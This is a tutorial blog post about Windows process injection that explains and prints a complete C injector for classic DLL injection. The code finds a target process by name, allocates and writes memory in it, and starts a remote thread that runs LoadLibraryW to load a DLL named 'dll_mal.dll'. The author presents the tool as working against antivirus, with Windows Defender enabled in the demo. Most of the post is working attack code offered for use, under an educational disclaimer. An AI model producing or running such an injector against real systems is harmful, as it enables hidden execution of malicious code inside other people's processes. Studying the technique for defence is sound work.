---
title: "Process Injection - DLL Injection"
date: 2026-02-06
categories: [Malware]
tags: [C, Malware, Engineering, WinAPI, Windows]
image: "https://i.pinimg.com/1200x/7b/50/ae/7b50ae1d568455c46bf06411f348e4d1.jpg"
---
⚠️ **Disclaimer | Educational Purpose Only**
>
> This content is provided **strictly for educational and research purposes**.
>  
> All techniques, concepts, and examples discussed in this post are intended to support the study of **information security, malware analysis, and defensive research** in controlled and legal environments.
>
> The author does **not encourage, support, or condone** the use of this material for malicious, illegal, or unethical activities.
>
> Any actions taken based on the information presented here are the **sole responsibility of the reader**.
>
> Always ensure that your research and experiments comply with **local laws, ethical guidelines, and institutional policies**.

---
## Introduction
In this post, I will present Process Injection techniques, more specifically DLL Injection. To understand how the code that will be explored works, we first need to understand some concepts about how the Windows operating system functions.
The mechanism behind the DLL Injection technique exploits the legitimate behavior of Windows itself, which allows code to be executed within the memory space of another process. In Windows, Dynamic Link Libraries (DLLs) are loaded dynamically through system functions such as LoadLibrary. By triggering this same routine remotely, it becomes possible to introduce external code without the need to modify the original executable on disk.

At the end of the post, I will leave a PoC video demonstrating how the technique works in practice, with Windows Defender enabled.

## FindProcessID Function 
```c
DWORD FindProcessId(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &processEntry)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
            CloseHandle(snapshot);
            return processEntry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &processEntry));

    CloseHandle(snapshot);
    return 0;
}
```
Before injecting a DLL, a target process must be chosen. For that, we built the FindProcessId function. This function is implemented to locate the PID of a process based on the name of an executable.
It begins by creating a snapshot of all active processes in the system using the [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) API:
```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
);
```
```c
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
``` 
This snapshot allows iteration over processes without interfering with the real structure at runtime. If snapshot creation fails, the function returns 0.

Subsequently, the [PROCESSENTRY32W](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32w)structure is initialized. This structure stores information about each enumerated process:

```c
PROCESSENTRY32W processEntry;
processEntry.dwSize = sizeof(PROCESSENTRY32W);
```
The dwSize field must be filled in mandatorily, since the API validates the structure size before using it.

### Process32FistW and Process32NextW
```c
    if (!Process32FirstW(snapshot, &processEntry)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
            CloseHandle(snapshot);
            return processEntry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &processEntry));

    CloseHandle(snapshot);
    return 0;
```
The function [Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) is used, according to Microsoft’s documentation, to:

```
Retrieves information about the first process encountered in a system snapshot.
```

This call then populates the structure with the first process in the list. After that, we create a loop using the function [Process32NextW](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw), which according to the documentation:
```
Retrieves information about the next process recorded in a system snapshot.
```
So, to make it easier to understand:

```c
do {
    if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
        ...
    }
} while (Process32NextW(snapshot, &processEntry));
```

At this point, a comparison occurs between the current executable name and the provided name. The _wcsicmp function performs a case-insensitive comparison between Unicode strings.

So it is basically a search loop through the processes that are running at that moment, and the goal is to find the exact process we are looking for in order to inject the payload. Visually, it is like iterating over an array.

## InjectDLL function
Now I will show the next function to be implemented in the code:
```c
BOOL InjectDLL(DWORD pid, const wchar_t* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return FALSE;
    }

    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, pathSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remoteMemory) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, pathSize, NULL)) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    FARPROC loadLibraryW = GetProcAddress(kernel32, "LoadLibraryW");
    if (!loadLibraryW) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE threadStart = (LPTHREAD_START_ROUTINE)loadLibraryW;

    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, 
                                           threadStart, 
                                           remoteMemory, 0, NULL);
    
    if (!remoteThread) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(remoteThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(remoteThread, &exitCode);
    


    CloseHandle(remoteThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return (exitCode != 0);
}
```

### Handle to the target process

The first block we must understand is:
```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```
This call requests full access to the process, including permission to read, write, allocate memory, and create threads. Without these permissions, injection would not be possible in this context. This process would certainly draw the attention of an EDR, however, since we are working with AVs for now, it is sufficient. 
With a valid handle in hand, the code calculates the size of the DLL path in bytes:
```c
SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
```
The +1 ensures the inclusion of the null terminator, which is necessary for LoadLibraryW to correctly interpret the string.

### Memory allocation in the remote process
The next step is to allocate memory within the address space of the remote process:

```c
LPVOID remoteMemory = VirtualAllocEx(
    hProcess,
    NULL,
    pathSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

Here, the OS creates a valid region in the target process’s VAD (Virtual Address Descriptor), with read and write permissions. After the allocation, the DLL path is written into that region:

```c
WriteProcessMemory(hProcess, remoteMemory, dllPath, pathSize, NULL);
```

This function copies the buffer from the injector process into the memory of the target process. Following the reasoning, our next step is to resolve the address of the function that will load the DLL, which is where the following snippet comes in:

```c
HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
FARPROC loadLibraryW = GetProcAddress(kernel32, "LoadLibraryW");
``` 

First, the base address of kernel32.dll already loaded in the current process is obtained. Next, the LoadLibraryW export is resolved through the DLL’s export table. The returned value is the starting address of the function in memory. This address is then converted to the type expected by a remote thread:

```c
LPTHREAD_START_ROUTINE threadStart =
    (LPTHREAD_START_ROUTINE)loadLibraryW;
```

### Remote thread creation
```c
HANDLE remoteThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    threadStart,
    remoteMemory,
    0,
    NULL
);
```
This snippet is a call that instructs the kernel to create a new thread inside the target process. A stack is assigned, and the instruction pointer register is set to point to LoadLibraryW, having as its argument the pointer to the string containing the path of the injected DLL. 
In practice, what will be executed in the remote process is equivalent to:

```c
LoadLibraryW(L"caminho\\dll_mal.dll");
```

After the creation, the code uses the WaitForSingleObject function to wait for the thread’s completion:

```c
 WaitForSingleObject(remoteThread, INFINITE);
```

Ensuring that the DLL loading has been completed before execution continues.
The thread’s exit code is then retrieved. When LoadLibraryW executes successfully, it returns the base address of the loaded DLL; therefore, a value different from zero indicates successful injection.

```c
DWORD exitCode = 0;
GetExitCodeThread(remoteThread, &exitCode);
```

## Main function 
```c
int main() {
    

    wchar_t processName[MAX_PATH] = L"calc.exe";
    
    DWORD pid = FindProcessId(processName);
    
    if (pid == 0) {
        
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", 
                           NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            system("pause");
            return 1;
        }
        
        pid = pi.dwProcessId;
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        Sleep(2000);
    } 
    
    wchar_t dllPath[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, dllPath);
    wcscat_s(dllPath, MAX_PATH, L"\\dll_mal.dll");
    
    printf("DLL: %ls\n", dllPath);
    
    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        system("pause");
        return 1;
    }
    
    
    if (InjectDLL(pid, dllPath)) {
        printf("dll");
    }
    
    getchar();
    
    return 0;
}
```

Now inside main, our caller function, we close all the remaining gaps needed to fully understand the technique. At this stage, the code initially defines the target process and attempts to locate its PID through the previously implemented enumeration function:

```c
wchar_t processName[MAX_PATH] = L"calc.exe";
DWORD pid = FindProcessId(processName);
```

If the process is not running, a new one is created. After creation, the PID of the newly instantiated process becomes the target for the injection:

```c
CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", ...);
```
In the following snippet, we can understand that the DLL path is built dynamically from the injector’s current directory, followed by the concatenation of the file name:

```c
GetCurrentDirectoryW(MAX_PATH, dllPath);
wcscat_s(dllPath, MAX_PATH, L"\\dll_mal.dll");
```

And finally, the injection function is called. Once successful, the DLL is mapped into the target process’s memory space, and any code implemented in its DllMain begins executing within the context of that process.

```c
InjectDLL(pid, dllPath);
```

## Final demonstration
<iframe width="560" height="315"
src="https://www.youtube.com/embed/0nP_j-zmElE"
title="YouTube video"
frameborder="0"
allowfullscreen>
</iframe>